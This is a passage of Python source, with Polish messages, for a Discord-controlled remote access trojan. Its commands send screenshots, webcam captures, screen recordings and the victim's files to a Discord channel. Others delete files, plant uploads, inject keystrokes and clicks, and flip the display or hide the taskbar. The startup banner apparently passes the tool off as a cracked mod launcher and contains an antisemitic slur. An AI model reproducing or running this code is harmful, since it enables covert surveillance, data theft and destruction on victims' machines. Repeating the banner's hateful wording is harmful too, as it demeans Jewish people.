    if ((Get-Random -Max 3) -eq 0) { [char](Get-Random -Min 33 -Max 126) } else { ' ' }
  })
  Write-Host $line -ForegroundColor Green
  Start-Sleep -Milliseconds 30
}
'''
    ps_run(f'Start-Process powershell -ArgumentList "-NoProfile","-Command","{ps}"')
    await ctx.send("🟢 Matrix uruchomiony!")


@bot.command(name="flip")
async def flip(ctx):
    if not IS_WINDOWS:
        return await ctx.send("❌ Tylko Windows.")
    ps_run(r'''
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class D {
  [DllImport("user32.dll")] public static extern bool EnumDisplaySettings(string d, int m, ref DEVMODE dm);
  [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Ansi)] public struct DEVMODE {
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmDeviceName;
    public short dmSpecVersion, dmDriverVersion, dmSize, dmDriverExtra;
    public int dmFields, dmPositionX, dmPositionY, dmDisplayOrientation, dmDisplayFixedOutput;
    public short dmColor, dmDuplex, dmYResolution, dmTTOption, dmCollate;
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmFormName;
    public short dmLogPixels; public int dmBitsPerPel, dmPelsWidth, dmPelsHeight, dmDisplayFlags, dmDisplayFrequency;
    public int dmICMMethod, dmICMIntent, dmMediaType, dmDitherType, dmReserved1, dmReserved2, dmPanningWidth, dmPanningHeight;
  }
  [DllImport("user32.dll")] public static extern int ChangeDisplaySettings(ref DEVMODE dm, int flags);
}
"@
$dm = New-Object D+DEVMODE
$dm.dmSize = [System.Runtime.InteropServices.Marshal]::SizeOf($dm)
[D]::EnumDisplaySettings($null, -1, [ref]$dm) | Out-Null
$dm.dmDisplayOrientation = 2
$dm.dmFields = 0x00080000
[D]::ChangeDisplaySettings([ref]$dm, 0) | Out-Null
''')
    await ctx.send("🔄 Ekran obrócony 180°.")


@bot.command(name="unflip")
async def unflip(ctx):
    if not IS_WINDOWS:
        return await ctx.send("❌ Tylko Windows.")
    ps_run(r'''
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class D2 {
  [DllImport("user32.dll")] public static extern bool EnumDisplaySettings(string d, int m, ref DEVMODE dm);
  [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Ansi)] public struct DEVMODE {
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmDeviceName;
    public short dmSpecVersion, dmDriverVersion, dmSize, dmDriverExtra;
    public int dmFields, dmPositionX, dmPositionY, dmDisplayOrientation, dmDisplayFixedOutput;
    public short dmColor, dmDuplex, dmYResolution, dmTTOption, dmCollate;
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmFormName;
    public short dmLogPixels; public int dmBitsPerPel, dmPelsWidth, dmPelsHeight, dmDisplayFlags, dmDisplayFrequency;
    public int dmICMMethod, dmICMIntent, dmMediaType, dmDitherType, dmReserved1, dmReserved2, dmPanningWidth, dmPanningHeight;
  }
  [DllImport("user32.dll")] public static extern int ChangeDisplaySettings(ref DEVMODE dm, int flags);
}
"@
$dm = New-Object D2+DEVMODE
$dm.dmSize = [System.Runtime.InteropServices.Marshal]::SizeOf($dm)
[D2]::EnumDisplaySettings($null, -1, [ref]$dm) | Out-Null
$dm.dmDisplayOrientation = 0
$dm.dmFields = 0x00080000
[D2]::ChangeDisplaySettings([ref]$dm, 0) | Out-Null
''')
    await ctx.send("🔄 Ekran przywrócony.")


@bot.command(name="swapmouse")
async def swapmouse(ctx):
    if IS_WINDOWS:
        ctypes.windll.user32.SwapMouseButton(True)
    await ctx.send("🖱️ Przyciski zamienione. (`!unswapmouse`)")


@bot.command(name="unswapmouse")
async def unswapmouse(ctx):
    if IS_WINDOWS:
        ctypes.windll.user32.SwapMouseButton(False)
    await ctx.send("🖱️ Przywrócono.")


@bot.command(name="cursor")
async def cursor(ctx, x: int, y: int):
    if IS_WINDOWS:
        ctypes.windll.user32.SetCursorPos(x, y)
    else:
        import pyautogui
        pyautogui.moveTo(x, y)
    await ctx.send(f"🖱️ Kursor → ({x}, {y})")


@bot.command(name="hideicons")
async def hideicons(ctx):
    if not IS_WINDOWS:
        return await ctx.send("❌ Tylko Windows.")
    ps_run(r'''
$sig = '[DllImport("user32.dll")] public static extern IntPtr FindWindow(string c, string n); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);'
$t = Add-Type -MemberDefinition $sig -Name W -Namespace X -PassThru
$c = [X.W]::FindWindow("SHELLDLL_DefView", $null)
if ($c -eq 0) { $c = [X.W]::FindWindow("WorkerW", $null) }
[X.W]::ShowWindow($c, 0)
''')
    await ctx.send("🙈 Ikony ukryte.")


@bot.command(name="showicons")
async def showicons(ctx):
    if not IS_WINDOWS:
        return await ctx.send("❌ Tylko Windows.")
    ps_run(r'''
$sig = '[DllImport("user32.dll")] public static extern IntPtr FindWindow(string c, string n); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);'
$t = Add-Type -MemberDefinition $sig -Name W2 -Namespace Y -PassThru
$c = [Y.W2]::FindWindow("SHELLDLL_DefView", $null)
if ($c -eq 0) { $c = [Y.W2]::FindWindow("WorkerW", $null) }
[Y.W2]::ShowWindow($c, 5)
''')
    await ctx.send("👁️ Ikony pokazane.")


@bot.command(name="taskbar")
async def taskbar(ctx):
    if not IS_WINDOWS:
        return await ctx.send("❌ Tylko Windows.")
    ps_run(r'''
$sig = '[DllImport("user32.dll")] public static extern IntPtr FindWindow(string c, string n); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);'
$t = Add-Type -MemberDefinition $sig -Name T -Namespace Z -PassThru
$h = $t::FindWindow("Shell_TrayWnd", $null)
[Z.T]::ShowWindow($h, 0)
''')
    await ctx.send("📏 Pasek zadań ukryty.")


@bot.command(name="taskbar-on")
async def taskbar_on(ctx):
    if IS_WINDOWS:
        ps_run(r'''
$sig = '[DllImport("user32.dll")] public static extern IntPtr FindWindow(string c, string n); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);'
$t = Add-Type -MemberDefinition $sig -Name T2 -Namespace W2 -PassThru
$h = $t::FindWindow("Shell_TrayWnd", $null)
[T2]::ShowWindow($h, 5)
''')
    await ctx.send("📏 Pasek zadań przywrócony.")


# ================== MULTIMEDIA ==================
@bot.command(name="screenshot")
async def screenshot(ctx):
    try:
        from PIL import ImageGrab
        path = os.path.join(os.environ.get("TEMP", "/tmp"), "screenshot.png")
        ImageGrab.grab().save(path)
        await ctx.send(file=discord.File(path))
        os.remove(path)
    except Exception as e:
        await ctx.send(f"❌ `{e}` (pip install pillow)")


@bot.command(name="webcam")
async def webcam(ctx):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return await ctx.send("❌ Brak dostępu do kamery.")
        path = os.path.join(os.environ.get("TEMP", "/tmp"), "cam.jpg")
        cv2.imwrite(path, frame)
        await ctx.send(file=discord.File(path))
        os.remove(path)
    except Exception as e:
        await ctx.send(f"❌ `{e}` (pip install opencv-python)")


@bot.command(name="record")
async def record(ctx, seconds: int = 5):
    seconds = max(1, min(30, seconds))
    await ctx.send(f"🎥 Nagrywam {seconds}s...")
    path = os.path.join(os.environ.get("TEMP", "/tmp"), "record.mp4")
    ffmpeg = resource_path("ffmpeg.exe") if IS_WINDOWS else "ffmpeg"
    try:
        if IS_WINDOWS:
            cmd = f'"{ffmpeg}" -y -f gdigrab -framerate 15 -i desktop -t {seconds} "{path}"'
        else:
            cmd = f'ffmpeg -y -f x11grab -framerate 15 -i :0.0 -t {seconds} "{path}"'
        subprocess.run(cmd, shell=True, capture_output=True, timeout=seconds + 20)
        if os.path.exists(path) and os.path.getsize(path) > 1000:
            if os.path.getsize(path) > 8 * 1024 * 1024:
                await ctx.send(f"📹 Nagranie za duże (>8MB), zapisane: `{path}`")
            else:
                await ctx.send(file=discord.File(path))
                os.remove(path)
        else:
            await ctx.send("❌ Nie udało się nagrać (brak ffmpeg?).")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="play")
async def play(ctx, *, url: str):
    try:
        tmp = os.path.join(os.environ.get("TEMP", "/tmp"), "sound.wav")
        with open(tmp, "wb") as f:
            f.write(requests.get(url, timeout=15).content)
        if IS_WINDOWS:
            ps_run(f"(New-Object Media.SoundPlayer '{tmp}').PlaySync()")
        await ctx.send("🎵 Odtwarzam.")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


# ================== PLIKI ==================
_bot_cwd = os.getcwd()


@bot.command(name="pwd")
async def pwd_cmd(ctx):
    await ctx.send(f"📂 `{_bot_cwd}`")


@bot.command(name="cd")
async def cd_cmd(ctx, *, path: str):
    global _bot_cwd
    try:
        new = os.path.abspath(os.path.expanduser(path))
        if os.path.isdir(new):
            _bot_cwd = new
            await ctx.send(f"📂 `{_bot_cwd}`")
        else:
            await ctx.send(f"❌ Nie ma takiego folderu.")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="ls")
async def ls(ctx, path: str = None):
    target = path or _bot_cwd
    try:
        items = os.listdir(target)
        out = []
        for it in sorted(items)[:80]:
            full = os.path.join(target, it)
            tag = "📁" if os.path.isdir(full) else "📄"
            size = os.path.getsize(full) if os.path.isfile(full) else 0
            out.append(f"{tag} {it:<40} ({size:>10} B)")
        await ctx.send(f"```\n{truncate(chr(10).join(out) or '(pusto)')}\n```")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="cat")
async def cat(ctx, *, path: str):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            await ctx.send(f"```\n{truncate(f.read(1900))}\n```")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="head")
async def head(ctx, path: str, n: int = 20):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()[:n]
        await ctx.send(f"```\n{truncate(''.join(lines))}\n```")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="tail")
async def tail(ctx, path: str, n: int = 20):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()[-n:]
        await ctx.send(f"```\n{truncate(''.join(lines))}\n```")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="grep")
async def grep(ctx, pattern: str, *, path: str):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            matches = [l for l in f if pattern.lower() in l.lower()][:50]
        await ctx.send(f"```\n{truncate(''.join(matches) or 'brak wyników')}\n```")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="download")
async def download(ctx, *, path: str):
    try:
        if not os.path.isfile(path):
            return await ctx.send("❌ To nie plik.")
        size = os.path.getsize(path)
        if size > 8 * 1024 * 1024:
            return await ctx.send(f"❌ Plik za duży ({size//1024//1024} MB). Limit: 8 MB.")
        await ctx.send(file=discord.File(path))
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="upload")
async def upload(ctx, path: str = "uploaded.bin"):
    if not ctx.message.attachments:
        return await ctx.send("❌ Dołącz plik do komendy.")
    for att in ctx.message.attachments:
        await att.save(path)
        await ctx.send(f"✅ Zapisano: `{path}` ({att.size} B)")


@bot.command(name="rm")
async def rm(ctx, *, path: str):
    try:
        if os.path.isdir(path):
            shutil.rmtree(path)
        else:
            os.remove(path)
        await ctx.send(f"🗑️ Usunięto: `{path}`")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="mkdir")
async def mkdir(ctx, *, path: str):
    try:
        os.makedirs(path, exist_ok=True)
        await ctx.send(f"📁 Utworzono: `{path}`")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="find")
async def find(ctx, *, pattern: str):
    try:
        root = Path.home()
        results = [str(p) for p in root.rglob(pattern)][:30]
        await ctx.send(f"```\n{truncate(chr(10).join(results) or 'brak')}\n```")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="tree")
async def tree(ctx, path: str = "."):
    try:
        lines = []
        for root, dirs, files in os.walk(path):
            level = root.replace(path, "").count(os.sep)
            if level > 3:
                continue
            lines.append("  " * level + "📁 " + os.path.basename(root) + "/")
            for f in files[:10]:
                lines.append("  " * level + "   📄 " + f)
        await ctx.send(f"```\n{truncate(chr(10).join(lines[:60]))}\n```")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="zip")
async def zip_cmd(ctx, source: str, output: str = "archive"):
    try:
        shutil.make_archive(output, "zip", source)
        path = f"{output}.zip"
        size = os.path.getsize(path)
        if size > 8 * 1024 * 1024:
            await ctx.send(f"📦 ZIP za duży ({size//1024//1024} MB), zapisany: `{path}`")
        else:
            await ctx.send(file=discord.File(path))
            os.remove(path)
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


# ================== WEJŚCIE ==================
@bot.command(name="type")
async def type_text(ctx, *, text: str):
    try:
        import pyautogui
        await ctx.send(f"⌨️ Piszę za 2s...")
        await asyncio.sleep(2)
        pyautogui.typewrite(text, interval=0.03)
    except Exception as e:
        await ctx.send(f"❌ `{e}` (pip install pyautogui)")


@bot.command(name="press")
async def press(ctx, *, key: str):
    try:
        import pyautogui
        pyautogui.press(key)
        await ctx.send(f"🔘 Naciśnięto: `{key}`")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="hotkey")
async def hotkey(ctx, *keys):
    try:
        import pyautogui
        pyautogui.hotkey(*keys)
        await ctx.send(f"⌨️ Skrót: `{'+'.join(keys)}`")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="click")
async def click(ctx, x: int, y: int):
    try:
        import pyautogui
        pyautogui.click(x, y)
        await ctx.send(f"🖱️ Klik: ({x}, {y})")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="rclick")
async def rclick(ctx, x: int, y: int):
    try:
        import pyautogui
        pyautogui.rightClick(x, y)
        await ctx.send(f"🖱️ PPM: ({x}, {y})")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="doubleclick")
async def doubleclick(ctx, x: int, y: int):
    try:
        import pyautogui
        pyautogui.doubleClick(x, y)
        await ctx.send(f"🖱️ 2× klik: ({x}, {y})")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="move")
async def move(ctx, x: int, y: int):
    try:
        import pyautogui
        pyautogui.moveTo(x, y)
        await ctx.send(f"🖱️ Mysz → ({x}, {y})")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="scroll")
async def scroll(ctx, n: int):
    try:
        import pyautogui
        pyautogui.scroll(n)
        await ctx.send(f"🖱️ Scroll: {n}")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


# ================== INFO ==================
@bot.command(name="ping-bot")
async def ping_bot(ctx):
    await ctx.send(f"🏓 Pong! `{round(bot.latency * 1000)} ms`")


@bot.command(name="stats")
async def stats(ctx):
    embed = discord.Embed(title="📊 Statystyki bota", color=0x5865F2)
    embed.add_field(name="Serwery", value=f"`{len(bot.guilds)}`", inline=True)
    embed.add_field(name="Użytkownicy", value=f"`{sum(g.member_count or 0 for g in bot.guilds)}`", inline=True)
    embed.add_field(name="Kanały", value=f"`{sum(len(g.channels) for g in bot.guilds)}`", inline=True)
    embed.add_field(name="Ping", value=f"`{round(bot.latency * 1000)} ms`", inline=True)
    embed.add_field(name="Wersja", value=f"`{VERSION}`", inline=True)
    embed.add_field(name="Uptime", value=f"`{fmt_uptime(time.time() - psutil.boot_time())}`", inline=True)
    await ctx.send(embed=embed)


# ================== URUCHOM ==================
if __name__ == "__main__":
    cprint(C.MAGENTA + C.BOLD, f"""
╔══════════════════════════════════════════════════════╗
║   🤖 Lux BombaClat do jebania zydów po wifi  v{VERSION}    ║
║   Lux Bomba mod launcher -Cracked by wypiorekk       ║
╚══════════════════════════════════════════════════════╝
""")
    cprint(C.YELLOW, f"[*] Łączenie z Discordem...")
    try:
        bot.run(TOKEN)
    except discord.LoginFailure:
        cprint(C.RED + C.BOLD, "[❌] BŁĄD: Token jest nieprawidłowy!")
        cprint(C.YELLOW, "[!] Sprawdź linię TOKEN = \"...\" na górze pliku.")
        cprint(C.YELLOW, "[!] Token resetuj na: https://discord.com/developers/applications")
    except Exception as e:
        cprint(C.RED, f"[❌] Błąd: {e}")